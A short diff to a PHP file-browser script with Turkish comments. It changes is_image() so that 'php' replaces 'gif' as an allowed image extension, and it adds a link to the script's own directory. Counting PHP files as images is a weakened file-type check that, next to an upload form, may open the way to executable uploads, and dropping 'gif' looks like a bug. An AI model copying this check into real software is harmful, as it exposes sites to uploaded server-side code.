@@ -29,7 +29,7 @@ $files = scandir($current_dir);
 
 function is_image($file) {
     $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
+    return in_array($ext, ['jpg', 'jpeg', 'png', 'php']);
 }
 
 // Dizinlerde gezinme bağlantılarını oluşturma
@@ -38,6 +38,7 @@ if ($current_dir != realpath($root)) {
     $navigation_links[] = '<a href="?dir=' . urlencode(dirname($current_dir)) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a>';
 }
 
+// Dizin içindeki dosya ve dizinleri listeleme
 foreach ($files as $file) {
     if ($file == '.' || $file == '..') continue;
     $file_path = $current_dir . '/' . $file;
@@ -48,12 +49,16 @@ foreach ($files as $file) {
     }
 }
 
+// "PHP kodu dizinine git" bağlantısı ekleme
+$php_code_dir_link = '<a href="?dir=' . urlencode(__DIR__) . '&up=' . urlencode($_GET['up']) . '">PHP Kodu Dizinine Git</a>';
+
 // Kullanıcıya dosyaları ve dizinleri gösterme
 echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
 echo "<ul>";
 foreach ($navigation_links as $link) {
     echo "<li>$link</li>";
 }
+echo "<li>$php_code_dir_link</li>"; // PHP kodu dizinine git bağlantısı burada
 echo "</ul>";
 
 // Dosya Yükleme Formu
